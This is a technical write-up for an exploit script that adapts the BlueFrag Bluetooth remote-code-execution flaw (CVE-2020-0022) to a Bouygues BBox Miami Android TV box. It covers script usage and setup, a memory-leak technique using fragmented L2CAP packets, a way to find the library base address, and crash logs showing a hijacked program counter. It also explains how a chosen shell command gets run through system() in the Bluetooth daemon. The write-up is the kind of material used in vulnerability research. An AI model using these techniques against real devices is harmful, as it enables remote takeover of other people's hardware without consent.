########################################################################################

CVE-2020-0022 vulnerability exploitation on Bouygues BBox Miami
Android TV 8.0 - ARM32 Cortex A9
By Polo35 - 2020/08/24

########################################################################################

"Usage: python polo_exploit.py target_bt_mac [target_adb_ip, shell_command, disable_reboot, verbose]"

########################################################################################

Based on scripts by Jan Ruge
CVE-2020-0022 an Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag
https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/


########################################################################################

INTRODUCTION & TIPS

########################################################################################

The script use python bluetooth module to get ACL connection handle
So you need to install bluetooth libraries and pybluez (version 0.22 for python2 and last version for python3)

sudo apt-get update
sudo apt-get install bluetooth bluez libbluetooth-dev
sudo pip install pybluez

You can pass a shell command to the script as parameter that will be executed with system function by the bluetooth deamon
There is only 104 characters available for the shell command because the ROP chain take 20 first bytes of the second payload

Exemple:
shell_command = "cat /dev/zero | echo 'Target Exploited' > /sdcard/Download/cve-2020-0022-poc"

The script can use adb to check connection inspect logcat and reboot the target when needed
For this you have to pass the target ip as parameter
Make sure to connect target with adb connect and open a shell to check connection before using the script

Best results are obtained by connecting the target via bluetooth with a smartphone when the script say it ;)
It can take more than 30 try to trigger the exploit but it sometime work at first try


########################################################################################

MEMORY LEAK WITH ARM32

########################################################################################

The Bouygues BBox Miami is based on an ARM 32 bytes Cortex A9 processor
The difference with ARM64 is that libc memcpy function doesn't underflow so it's impossible to get same leaks as Jan Ruge
But the vulnerability is present and is exploitable in a different way


By sending l2cap packet with 4 bytes fragmentation we can trigger a memcpy of 0 length in reassemble_and_dispatch
This allow to get 4 bytes of uninitialized data at end of echo

Increasing first packet length (further named mem_offset) allow to "walk" the uninitialized memory
Getting 32 echos with same mem_offset give 2 to 8 exploitable echos
Echos are repeated so no need to get more then 32 echos at same mem_offset
This method we also feel memory with the packets so it's easy to reconize patterns and find offsets in leaks

The mem_offset is the length of the l2cap packet in characters
Ex: mem_offset 184 = l2cap packet of 184 characters = l2cap packet of 368 bytes

Example of memory "walking" and uninitialized data with repetitions:

176: 00000000 01000000 01000000 00000000 00000000 01000000 00000000 00000000 00000000 01000000 01000000 00000000 00000000 01000000 00000000 00000000 ................................................................
177: 00000000 000000a4 00000024 00000000 00000000 000000a4 00000000 00000000 00000000 000000a4 00000024 00000000 00000000 000000a4 00000000 00000000 ...........$...............................$....................
178: 00000000 0000a4ce 000024d2 00000000 00000000 0000a4d5 00000000 00000000 00000000 0000a4ce 000024d2 00000000 00000000 0000a4d5 00000000 00000000 ..........$...............................$.....................
179: 00000000 00a4ce80 0024d280 00000000 00000000 00a4d580 00000000 00000000 00000000 00a4ce80 0024d280 00000000 00000000 00a4d580 00000000 00000000 .........$...............................$......................
180: 00000000 a4ce80a3 24d280a3 00000000 00000000 a4d580a3 00000000 00000000 00000000 a4ce80a3 24d280a3 00000000 00000000 a4d580a3 00000000 00000000 ........$...............................$.......................
181: 00000000 ce80a39c d280a31c 00000000 00000000 d580a39c 00000000 00000000 00000000 ce80a39c d280a31c 00000000 00000000 d580a39c 00000000 00000000 ................................................................
182: 00000000 80a39cce 80a31cd2 00000000 00000000 80a39cd5 00000000 00000000 00000000 80a39cce 80a31cd2 00000000 00000000 80a39cd5 00000000 00000000 ................................................................
183: 00000000 a39cce80 a31cd280 00000000 00000000 a39cd580 00000000 00000000 00000000 a39cce80 a31cd280 00000000 00000000 a39cd580 00000000 00000000 ................................................................
184: 00000000 9cce80a3 1cd280a3 00000000 00000000 9cd580a3 00000000 00000000 00000000 9cce80a3 1cd280a3 00000000 00000000 9cd580a3 00000000 00000000 ................................................................
185: 00000000 ce80a300 d280a300 00000000 00000000 d580a300 00000000 00000000 00000000 ce80a300 d280a300 00000000 00000000 d580a300 00000000 00000000 ................................................................
186: 00000000 80a30000 80a30000 00000000 00000000 80a30000 00000000 00000000 00000000 80a30000 80a30000 00000000 00000000 80a30000 00000000 00000000 ................................................................
187: 00000000 a3000000 a3000000 00000000 00000000 a3000000 00000000 00000000 00000000 a3000000 a3000000 00000000 00000000 a3000000 00000000 00000000 ................................................................
188: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 ................................................................

We can see at mem_offset 180 and 184 some memory address in little endian

a4ce80a3 give address 0xa380cea4
24d280a3 give address 0xa380d224
a4d580a3 give address 0xa380d5a4
9cce80a3 give address 0xa380ce9c
1cd280a3 give address 0xa380d21c
9cd580a3 give address 0xa380d59c

There is at least 4 or 5 mem_offset where is possible to find real memory address after nearly all reboot
We will see later how we can use them


########################################################################################

ANALYSE OF FIRST CRASH

########################################################################################

By sending l2cap packet with 2 bytes fragmentation we can trigger a memcpy of -2 length in reassemble_and_dispatch
This allow to overflow outside the partial packet with 30 bytes of controlled data from the second packet
Because of the 30 copied bytes it's not necessary to send packets bigger than 32 bytes with 4 last bytes null

This overflow method sometimes crash the bluetooth deamon with controlled R0 register in _Z11list_appendP6list_tPv+65:

HCI: Found link transmit data buffer queue at 0xab90dbc4
HCI: Found SetDataAdvDataSender function at 0x91875b29
HCI: Found bte_hh_evt function at 0x91818429
HCI: Found bluetooth library base address at 0x917a0000
First payload:
0x00: 0xdead0000 | 0x04: 0xdead0001 | 0x08: 0xdead0002 | 0x0c: 0xdead0003
0x10: 0xdead0004 | 0x14: 0xdead0005 | 0x18: 0xdead0006 | 0x1c: 0xdead0007
Second payload:
0x00 : 0xab90db14: 0xdead0008 | 0xab90db18: 0xdead0009 | 0xab90db1c: 0xdead000a | 0xab90db20: 0xdead000b
0x10 : 0xab90db24: 0xdead000c | 0xab90db28: 0xdead000d | 0xab90db2c: 0xdead000e | 0xab90db30: 0xdead000f
0x20 : 0xab90db34: 0xdead0010 | 0xab90db38: 0xdead0011 | 0xab90db3c: 0xdead0012 | 0xab90db40: 0xdead0013
0x30 : 0xab90db44: 0xdead0014 | 0xab90db48: 0xdead0015 | 0xab90db4c: 0xdead0016 | 0xab90db50: 0xdead0017
0x40 : 0xab90db54: 0xdead0018 | 0xab90db58: 0xdead0019 | 0xab90db5c: 0xdead001a | 0xab90db60: 0xdead001b
0x50 : 0xab90db64: 0xdead001c | 0xab90db68: 0xdead001d | 0xab90db6c: 0xdead001e | 0xab90db70: 0xdead001f
0x60 : 0xab90db74: 0xdead0020 | 0xab90db78: 0xdead0021 | 0xab90db7c: 0xdead0022 | 0xab90db80: 0xdead0023
0x70 : 0xab90db84: 0xdead0024 | 0xab90db88: 0xdead0025 | 0xab90db8c: 0xdead0026 | 0xab90db90: 0xdead0027
0x80 : 0xab90db94: 0xdead0028 | 0xab90db98: 0xdead0029 | 0xab90db9c: 0xdead002a | 0xab90dba0: 0xdead002b
0x90 : 0xab90dba4: 0xdead002c | 0xab90dba8: 0xdead002d | 0xab90dbac: 0xdead002e | 0xab90dbb0: 0xdead002f
0xa0 : 0xab90dbb4: 0xdead0030 | 0xab90dbb8: 0xdead0031 | 0xab90dbbc: 0xdead0032 | 0xab90dbc0: 0xdead0033
0xb0 : 0xab90dbc4: 0xdead0034 | 0xab90dbc8: 0xdead0035
ADB: Found interesting crash !!!
libc    : Fatal signal 11 (SIGSEGV), code 1, fault addr 0xdead0003 in tid 3918 (bt_workqueue)
DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
DEBUG   : Build fingerprint: 'BouyguesTelecom/BouygtelTV/HMB4213H:8.0.0/CALIFORNIE/6.30.13:user/release-keys'
DEBUG   : Revision: '0'
DEBUG   : ABI: 'arm'
DEBUG   : pid: 3871, tid: 3918, name: bt_workqueue  >>> com.android.bluetooth <<<
DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xdead0003
DEBUG   :     r0 dead0003  r1 90d13e00  r2 90d13e00  r3 00000000
DEBUG   :     r4 ab9059f8  r5 90d13e00  r6 00000000  r7 00000000
DEBUG   :     r8 00000000  r9 904df340  sl 904df338  fp 00000001
DEBUG   :     ip acf310ec  sp 904defd8  lr 918a3131  pc 918c98e2  cpsr a00f0030
DEBUG   : 
DEBUG   : backtrace:
DEBUG   :     #00 pc 001298e2  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z11list_appendP6list_tPv+65)
DEBUG   :     #01 pc 0010312d  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z24l2c_link_check_send_pktsP12t_l2c_linkcbP9t_l2c_ccbP6BT_HDR+36)
DEBUG   :     #02 pc 0010298f  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z22l2c_link_hci_conn_comphtPh+78)
DEBUG   :     #03 pc 000e5371  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z22btu_hcif_process_eventhP6BT_HDR+440)
DEBUG   :     #04 pc 000e6607  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z17btu_hci_msg_readyP13fixed_queue_tPv+42)
DEBUG   :     #05 pc 001290df  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL22internal_dequeue_readyPv+46)
DEBUG   :     #06 pc 0012b535  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL11run_reactorP9reactor_ti+216)
DEBUG   :     #07 pc 0012b431  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z13reactor_startP9reactor_t+44)
DEBUG   :     #08 pc 0012c729  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL10run_threadPv+136)
DEBUG   :     #09 pc 00047f17  /system/lib/libc.so (_ZL15__pthread_startPv+22)
DEBUG   :     #10 pc 0001b1dd  /system/lib/libc.so (__start_thread+32)

The disassembly at 001298e2 give:

.text:0x1298E0 loc_1298E0                              ; CODE XREF: list_append:loc_1298CA↑j
.text:0x1298E0                 LDR             R0, [R4,#0x10]                                       => Load R0 from R4+0x10
.text:0x1298E2                 LDR             R1, [R0]                                             => Load R1 from R0                     => Crash if not controlled !!!
.text:0x1298E4                 MOVS            R0, #8                                               => Set 8 in R0
.text:0x1298E6                 BLX             R1                                                   => Branch with Link and exchange to R1 => Branch to controlled R1

The decompilation show that we overwrite the memory at address of R4+0x10 which is allocator in the call "node = list->allocator->alloc(8)":

signed int list_append(list_t *list_ptr, void *data_ptr)
{
list_t *list = list_ptr; // r4
...
list_node_t *node = (list_node_t*)list->allocator->alloc(sizeof(list_node_t));                <= list = r4 / allocator = offset 0x10 / alloc = r1 / 8 = r0 / CRASH !!!
...
node->data = data_ptr; // r5
...
}

The deamon crashed on LDR R1, [R0] with R0 register = dead0003 when trying to load the address
We can control R0 with first payload + 0xC so if we place a valid address in it we can control R1 with the LDR R1, [R0] and than control PC with BLX R1 


########################################################################################

CONTROL PROGRAM COUNTER BY OVERFLOWING LEAKED ADDRESS

########################################################################################

Using the overflow method with the first memory address found at mem_offset 180 allow to move the crash to a branch to controlled R1 register

HCI: Got ACL connection handle: 0xb                                                                                                                             
HCI: Getting link transmit data buffer queue pointer...
HCI: Found link transmit data buffer queue at 0xa458dbc4
HCI: Getting bluetooth library function pointers...
HCI: Found SetDataAdvDataSender function at 0x8a4a3b29
HCI: Found bluetooth library base address at 0x8a3ce000
Building the payloads...
First payload:
0x00: 0xdead0000 | 0x04: 0xdead0001 | 0x08: 0xdead0002 | 0x0c: 0xa458dbc4
0x10: 0xdead0003 | 0x14: 0xdead0004 | 0x18: 0xdead0005 | 0x1c: 0xdead0006
Second payload:
0x00 : 0xa458dbc4: 0xdead0007 | 0xa458dbc8: 0xdead0008 | 0xa458dbcc: 0xdead0009 | 0xa458dbd0: 0xdead000a
0x10 : 0xa458dbd4: 0xdead000b | 0xa458dbd8: 0xdead000c | 0xa458dbdc: 0xdead000d | 0xa458dbe0: 0xdead000e
0x20 : 0xa458dbe4: 0xdead000f | 0xa458dbe8: 0xdead0010 | 0xa458dbec: 0xdead0011 | 0xa458dbf0: 0xdead0012
0x30 : 0xa458dbf4: 0xdead0013 | 0xa458dbf8: 0xdead0014 | 0xa458dbfc: 0xdead0015 | 0xa458dc00: 0xdead0016
0x40 : 0xa458dc04: 0xdead0017 | 0xa458dc08: 0xdead0018 | 0xa458dc0c: 0xdead0019 | 0xa458dc10: 0xdead001a
0x50 : 0xa458dc14: 0xdead001b | 0xa458dc18: 0xdead001c | 0xa458dc1c: 0xdead001d | 0xa458dc20: 0xdead001e
0x60 : 0xa458dc24: 0xdead001f | 0xa458dc28: 0xdead0020 | 0xa458dc2c: 0xdead0021 | 0xa458dc30: 0xdead0022
0x70 : 0xa458dc34: 0xdead0023 | 0xa458dc38: 0xdead0024 | 0xa458dc3c: 0xdead0025 | 0xa458dc40: 0xdead0026
0x80 : 0xa458dc44: 0xdead0027 | 0xa458dc48: 0xdead0028 | 0xa458dc4c: 0xdead0029 | 0xa458dc50: 0xdead002a
0x90 : 0xa458dc54: 0xdead002b | 0xa458dc58: 0xdead002c | 0xa458dc5c: 0xdead002d | 0xa458dc60: 0xdead002e
0xa0 : 0xa458dc64: 0xdead002f | 0xa458dc68: 0xdead0030 | 0xa458dc6c: 0xdead0031 | 0xa458dc70: 0xdead0032
0xb0 : 0xa458dc74: 0xdead0033 | 0xa458dc78: 0xdead0034
Prepare to connect to the target via bluetooth with your smartphone
HCI: Spraying second payload at 0xa458dbc4
Connect to the target via bluetooth with your smartphone                                                                                                        
HCI: Triggering the exploit with first payload... (1/3)
ADB: Bluetooth deamon crashed (3/20)                                                                                                                            
ADB: Found interesting crash !!!
07-20 09:28:01.020 20972 21006 F libc    : Fatal signal 11 (SIGSEGV), code 1, fault addr 0xdead0032 in tid 21006 (bt_workqueue)
07-20 09:28:01.123 21061 21061 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
07-20 09:28:01.123 21061 21061 F DEBUG   : Build fingerprint: 'BouyguesTelecom/BouygtelTV/HMB4213H:8.0.0/CALIFORNIE/6.30.13:user/release-keys'
07-20 09:28:01.123 21061 21061 F DEBUG   : Revision: '0'
07-20 09:28:01.123 21061 21061 F DEBUG   : ABI: 'arm'
07-20 09:28:01.123 21061 21061 F DEBUG   : pid: 20972, tid: 21006, name: bt_workqueue  >>> com.android.bluetooth <<<
07-20 09:28:01.123 21061 21061 F DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xdead0032
07-20 09:28:01.123 21061 21061 F DEBUG   :     r0 00000008  r1 dead0033  r2 8970a200  r3 00000000
07-20 09:28:01.123 21061 21061 F DEBUG   :     r4 a4585c38  r5 8970a200  r6 00000000  r7 00000000
07-20 09:28:01.123 21061 21061 F DEBUG   :     r8 00000000  r9 891fd340  sl 891fd338  fp 00000001
07-20 09:28:01.124 21061 21061 F DEBUG   :     ip a66aa0ec  sp 891fcfd8  lr 8a4f78e9  pc dead0032  cpsr 200f0030
07-20 09:28:01.228 21061 21061 F DEBUG   : 
07-20 09:28:01.228 21061 21061 F DEBUG   : backtrace:
07-20 09:28:01.228 21061 21061 F DEBUG   :     #00 pc dead0032  <unknown>
07-20 09:28:01.229 21061 21061 F DEBUG   :     #01 pc 001298e7  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z11list_appendP6list_tPv+70)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #02 pc 0010312d  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z24l2c_link_check_send_pktsP12t_l2c_linkcbP9t_l2c_ccbP6BT_HDR+36)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #03 pc 0010298f  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z22l2c_link_hci_conn_comphtPh+78)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #04 pc 000e5371  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z22btu_hcif_process_eventhP6BT_HDR+440)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #05 pc 000e6607  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z17btu_hci_msg_readyP13fixed_queue_tPv+42)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #06 pc 001290df  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL22internal_dequeue_readyPv+46)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #07 pc 0012b535  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL11run_reactorP9reactor_ti+216)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #08 pc 0012b431  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z13reactor_startP9reactor_t+44)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #09 pc 0012c729  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL10run_threadPv+136)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #10 pc 00047f17  /system/lib/libc.so (_ZL15__pthread_startPv+22)
07-20 09:28:01.229 21061 21061 F DEBUG   :     #11 pc 0001b1dd  /system/lib/libc.so (__start_thread+32)

The same disassembly at 001298e7 give:

.text:0x1298E0 loc_1298E0                              ; CODE XREF: list_append:loc_1298CA↑j
.text:0x1298E0                 LDR             R0, [R4,#0x10]                                       => Load R0 from R4+0x10
.text:0x1298E2                 LDR             R1, [R0]                                             => Load R1 from R0                     => Crash if not controlled
.text:0x1298E4                 MOVS            R0, #8                                               => Set 8 in R0
.text:0x1298E6                 BLX             R1                                                   => Branch with link and exchange to R1 => Branch to controlled R1 !!!
.text:0x1298E8                 MOV             R1, R0

The deamon now crashed on BLX R1 with R1 register = dead0033
This is the pattern sent in fragmented packets when getting leaks at mem_offset 184
This will be the second payload with a known address at an offset of - 0xb0 from first memory address found at mem_offset 180

We can now control PC of bluetooth.marvellberlin.so library have a second place in memory with the data and we know the address of this one

After the signal the registers contains:
- R0 = 0x8
- R1 = second payload value + 0xb0
- R4 = first payload address - 0x4


########################################################################################

GET THE BLUETOOTH LIBRARY BASE ADDRESS

########################################################################################

Using the leak method at mem_offset 28 we are able to find some memory address:

0026 : 00002954 74007400 74006600 58a9292b 74006600 74007400 72002e00 58a9292b 00002954 70007000 74007400 58a9292b 74006600 74007400 74006600 58a9292b : ..)Tt.t.t.f.X.)+t.f.t.t.r...X.)+..)Tp.p.t.t.X.)+t.f.t.t.t.f.X.)+
0027 : 0029546c 00740066 002e0074 a9292b72 00660000 00700066 00740066 a9292b72 0029546c 00740066 00660066 a9292b72 00660000 00740066 002e0074 a9292b72 : .)Tl.t.f...t.)+r.f...p.f.t.f.)+r.)Tl.t.f.f.f.)+r.f...t.f...t.)+r
0028 : 29546c8f 70006600 74006600 292b728f 66000000 74006600 66006600 292b728f 29546c8f 74006600 2e007400 292b728f 66000000 70006600 74006600 292b728f : )Tl.p.f.t.f.)+r.f...t.f.f.f.)+r.)Tl.t.f...t.)+r.f...p.f.t.f.)+r.
0029 : 00660066 00660000 2b728f01 00000000 00660000 00740074 2b728f01 00660066 00660000 00660066 2b728f01 00000000 00660000 00660000 2b728f01 00740074 : .f.f.f..+r.......f...t.t+r...f.f.f...f.f+r.......f...f..+r...t.t
0030 : 66006600 66000000 728f0100 00000000 66000000 66006600 728f0100 74007400 66006600 66000000 728f0100 00000000 66000000 66000000 728f0100 74007400 : f.f.f...r.......f...f.f.r...t.t.f.f.f...r.......f...f...r...t.t.

We can see leaks 29546c8f and 292b728f which give address 0x8f6c5429 and 0x8f722b29 in little endian

Using the overflow method with those address crash the deamon in bluetooth.marvellberlin.so with the following crash dump:

libc    : Fatal signal 11 (SIGSEGV), code 1, fault addr 0x10 in tid 4151 (bt_workqueue)
DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
DEBUG   : Build fingerprint: 'BouyguesTelecom/BouygtelTV/HMB4213H:8.0.0/CALIFORNIE/6.30.13:user/release-keys'
DEBUG   : Revision: '0'
DEBUG   : ABI: 'arm'
DEBUG   : pid: 4107, tid: 4151, name: bt_workqueue  >>> com.android.bluetooth <<<
DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x10
DEBUG   : Cause: null pointer dereference
DEBUG   :     r0 00000008  r1 8c35db29  r2 8b006300  r3 00000020
DEBUG   :     r4 a6405578  r5 8b006300  r6 00000020  r7 ff183456
DEBUG   :     r8 a6405560  r9 00000006  sl 00000002  fp 8affef70
DEBUG   :     ip 00001e7e  sp 8affef60  lr 8c3b18e9  pc 8c35db3c  cpsr 200f0030
DEBUG   : 
DEBUG   : backtrace:
DEBUG   :     #00 pc 000d5b3c  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZN4base8internal7InvokerINS0_9BindStateIMN12_GLOBAL__N_125BleAdvertisingManagerImplEFvhhhhPhNS_8CallbackIFvhELNS0_8CopyModeE1EEEEJNS0_17UnretainedWrapperIS4_EEbEEEFvhhhS5_S9_EE3RunEPNS0_13BindStateBaseEOhSJ_SJ_OS5_OS9_+19)
DEBUG   :     #01 pc 001298e7  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z11list_appendP6list_tPv+70)
DEBUG   :     #02 pc 0010312d  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z24l2c_link_check_send_pktsP12t_l2c_linkcbP9t_l2c_ccbP6BT_HDR+36)
DEBUG   :     #03 pc 0010477f  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z16l2c_rcv_acl_dataP6BT_HDR+2190)
DEBUG   :     #04 pc 001290df  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL22internal_dequeue_readyPv+46)
DEBUG   :     #05 pc 0012b535  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL11run_reactorP9reactor_ti+216)
DEBUG   :     #06 pc 0012b431  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_Z13reactor_startP9reactor_t+44)
DEBUG   :     #07 pc 0012c729  /system/vendor/lib/hw/bluetooth.marvellberlin.so (_ZL10run_threadPv+136)
DEBUG   :     #08 pc 00047f17  /system/lib/libc.so (_ZL15__pthread_startPv+22)
DEBUG   :     #09 pc 0001b1dd  /system/lib/libc.so (__start_thread+32)

We land in .text section of bluetooth.marvellberlin.so library at offset 000d5b3c

.text:0x0D5B28 SetDataAdvDataSender                  ; DATA XREF: .text:0x0D2B82↑o
.text:0x0D5B28
.text:0x0D5B28                 PUSH.W          {R4-R11,LR}
.text:0x0D5B2C                 SUB             SP, SP, #0x1C
.text:0x0D5B2E                 LDR             R7, =(off_1A2718 - 0xD5B38)
.text:0x0D5B30                 ADD.W           R11, SP, #0x10
.text:0x0D5B34                 ADD             R7, PC  ; off_1A2718
.text:0x0D5B36                 LDR             R7, [R7]
.text:0x0D5B38                 LDR             R7, [R7]
.text:0x0D5B3A                 STR             R7, [SP,#0x1C-4]
.text:0x0D5B3C                 LDRD.W          R10, R7, [R0,#8]

The crash is at 0xd5b3c just after the start of a function so the found address is a pointer to this function
This fonction is SetDataAdvDataSender of the class BleAdvertisingManagerImpl used as a pointer in SetData function of btm_ble_multi_adv.cc file

void SetData(uint8_t inst_id, bool is_scan_rsp, std::vector<uint8_t> data, MultiAdvCb cb) override {
...
DivideAndSendData(inst_id, data, cb, base::Bind(&BleAdvertisingManagerImpl::SetDataAdvDataSender, base::Unretained(this), is_scan_rsp));
}

We now have the address of a fixed location in bluetooth.marvellberlin.so library and can compute the base address of this library
The real offset to library base address is 0XD5B29 from the pointer to SetDataAdvDataSender function found at mem_offset 28

In the example above we found SetDataAdvDataSender function at 0X8C35DB29 and overflowed this address
The bluetooth library base address was 0X8C35DB29 - 0XD5B29 = 0X8C288000

We also found a pointer to 0x8C300429 in the same leak at mem_offset 28
The offset between the 2 found addresses is 0x8C35DB29 - 0x8C300429 = 0x5D700
We know that SetDataAdvDataSender is at 0xD5B28 in the bluetooth library so we can compute the address of the second found pointer: 0xD5B28 - 0x5D700 = 0x78428
At 0x78428 in the bluetooth library we have the function bte_hh_evt which is use in btif_hh_service_registration and btif_hh_execute_service functions of btif_hh.cc file

void btif_hh_service_registration(bool enable) {
...
BTA_HhEnable(BTA_SEC_ENCRYPT, bte_hh_evt);
...
}

bt_status_t btif_hh_execute_service(bool b_enable) {
...
BTA_HhEnable(BTUI_HH_SECURITY, bte_hh_evt);
...
}

The 2 found address at mem_offset 28 always ends with 0xB29 for SetDataAdvDataSender function and 0x429 for bte_hh_evt function
With this method we only need one of the 2 known address in the leak to find the bluetooth base address

To summarize we can find bluetooth library base address with:
- Found SetDataAdvDataSender function address which ends with 0xB29 => Apply an offset of 0xD5B28
- Found bte_hh_evt function address which ends with 0x429 and applying => Apply an offset of 0x78429


########################################################################################

ANALYSE OF CRASH WITH ANDROID SOURCE CODE

########################################################################################

The source code of android oreo 8.1 show that we overwrite a part of the link transmit data buffer queue object p_lcb->link_xmit_data_q

l2c_rcv_acl_data function create the tL2C_LCB* p_lcb object and pass it to l2c_link_check_send_pkts function which append the packet to link_xmit_data_q buffer queue

void l2c_rcv_acl_data(BT_HDR* p_msg) {
...
tL2C_LCB* p_lcb;
...
/* Find the LCB based on the handle */
p_lcb = l2cu_find_lcb_by_handle(handle);
...
/* Send the data through the channel state machine */
if (rcv_cid == L2CAP_SIGNALLING_CID) {
process_l2cap_cmd(p_lcb, p, l2cap_len);
...
}

tL2C_LCB* l2cu_find_lcb_by_handle(uint16_t handle) {
...
tL2C_LCB* p_lcb = &l2cb.lcb_pool[0];

for (xx = 0; xx < MAX_L2CAP_LINKS; xx++, p_lcb++) {
if ((p_lcb->in_use) && (p_lcb->handle == handle)) {
return (p_lcb);
}
}
...
}

p_lcb is taken from the static l2cb.lcb_pool[0] object as define in l2c_main.cc

/******************************************************************************/
/*               G L O B A L      L 2 C A P       D A T A                     */
/******************************************************************************/
tL2C_CB l2cb;

static void process_l2cap_cmd(tL2C_LCB* p_lcb, uint8_t* p, uint16_t pkt_len) {
...
case L2CAP_CMD_ECHO_REQ:
l2cu_send_peer_echo_rsp(p_lcb, id, p, cmd_len);
...
}

void l2cu_send_peer_echo_rsp(tL2C_LCB* p_lcb, uint8_t id, uint8_t* p_data, uint16_t data_len) {
...
p_buf = l2cu_build_header(p_lcb, (uint16_t)(L2CAP_ECHO_RSP_LEN + data_len), L2CAP_CMD_ECHO_RSP, id);
...
l2c_link_check_send_pkts(p_lcb, NULL, p_buf);
}


void l2c_link_check_send_pkts(tL2C_LCB* p_lcb, tL2C_CCB* p_ccb, BT_HDR* p_buf) {
...
list_append(p_lcb->link_xmit_data_q, p_buf);
...
}

bool list_append(list_t* list, void* data) {
...
list_node_t* node = (list_node_t*)list->allocator->alloc(sizeof(list_node_t));     => Call to alloc replaced by our call (Only one parameter !!!)
...
}

The definition of link_xmit_data_q in tL2C_LCB structure is:

/* Define a link control block. There is one link control block between
* this device and any other device (i.e. BD ADDR).
*/
typedef struct t_l2c_linkcb {
...
list_t* link_xmit_data_q;    /* Link transmit data buffer queue */  | Size 0x4 | Offset 0x44 
...
} tL2C_LCB;

The definition of list_t structure is:

typedef struct list_t {
list_node_t* head;                                                | Size 0x4 | Offset 0x0
list_node_t* tail;                                                | Size 0x4 | Offset 0x4
size_t length;                                                    | Size 0x4 | Offset 0x8
list_free_cb free_cb;                                             | Size 0x4 | Offset 0xC
const allocator_t* allocator;                                     | Size 0x4 | Offset 0x10
} list_t;                                                           | Size 0x14                                                        

With list_node_t structure:                                         

struct list_node_t {                                                
struct list_node_t* next;                                         | Size 0x4 | Offset 0x0
void* data;                                                       | Size 0x4 | Offset 0x4
};                                                                  | Size 0x8                                                                  

And allocator_t structure:                                          

typedef struct {                                                    
alloc_fn alloc;                                                   | Size 0x4 | Offset 0x0
free_fn free;                                                     | Size 0x4 | Offset 0x4
} allocator_t;                                                      | Size 0x8                                                   

typedef struct {                                                    
uint16_t event;                                                    | Size 0x2 | Offset 0x0
uint16_t len;                                                      | Size 0x2 | Offset 0x2
uint16_t offset;                                                   | Size 0x2 | Offset 0x4
uint16_t layer_specific;                                           | Size 0x2 | Offset 0x6
uint8_t data[];                                                    | Size 0xx | Offset 0x8
} BT_HDR;                                                            | Size 0x8 + data length


The disassembly of l2c_link_check_send_pkts function:

.text:0x00103108                 PUSH.W          {R4-R11,LR}
.text:0x0010310C                 SUB             SP, SP, #0x14
.text:0x0010310E                 MOV             R4, R0                                       => Move R0 to R4                        => Set R4 = R0 = tL2C_LCB* p_lcb
.text:0x00103110                 CBZ             R2, loc_10311C                               => Jump if R2 is null                   => Jump if BT_HDR* p_buf is null
.text:0x00103112                 MOVS            R0, #0                                       => Move 0 to R0                         => 
.text:0x00103114                 CBZ             R1, loc_103120                               => Jump if R1 is null                   => Jump if tL2C_CCB* p_ccb is null
.text:0x00103116                 LDRH            R1, [R1,#0x2C]                               => Load R1 + 0x2C into R1               => Load R1 with p_ccb->local_cid
.text:0x00103118                 MOVS            R7, #1                                       => Move 1 to R7                         => Set single_write = true
.text:0x0010311A                 B               loc_103124                                   => Branch to loc_103124
.text:0x00103124 loc_103124
.text:0x00103124                 STRH            R1, [R2]                                     => Store R1 high into R2                => Set p_buf->event = p_ccb->local_cid
.text:0x00103126                 MOV             R1, R2                                       => Move R2 to R1                        => Set R1 = R2 = BT_HDR* p_buf
.text:0x00103128                 STRH            R0, [R2,#6]                                  => Store R0 into R2 + 0x6               => Set p_buf->layer_specific = 0
.text:0x0010312A                 LDR             R0, [R4,#0x44]                               => Load R4 + 0x44 into R0               => Load R0 with list_t* p_lcb->link_xmit_data_q from R4 + 0x44
.text:0x0010312C                 BL              list_append                                  => Branch with link to list_append

Before the call to list_append function registers contains:

- R0 = list_t* p_lcb->link_xmit_data_q object with the first payload
- R1 and R2 = BT_HDR* p_buf object with the second payload
- R4 = tL2C_LCB* p_lcb object with the first payload at 0x44
- R7 = 1

The disassembly of list_append function:

.text:0x001298A0                 PUSH            {R4,R5,R7,LR}
.text:0x001298A2                 SUB             SP, SP, #0x138
